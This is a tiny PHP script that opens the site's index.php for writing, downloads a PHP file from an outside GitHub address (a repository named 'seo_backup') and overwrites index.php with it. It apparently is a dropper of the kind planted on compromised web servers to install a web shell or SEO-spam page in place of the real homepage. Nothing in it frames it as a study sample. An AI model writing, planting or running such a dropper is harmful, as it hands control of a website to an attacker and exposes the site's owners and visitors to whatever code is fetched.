<?php
$nama= fopen("index.php" ,"w+");
  $file = file_get_contents('https://raw.githubusercontent.com/nobody1331/seo_backup/main/roh.php');
  $tulis = fwrite ($nama ,$file);
 fclose($nama);
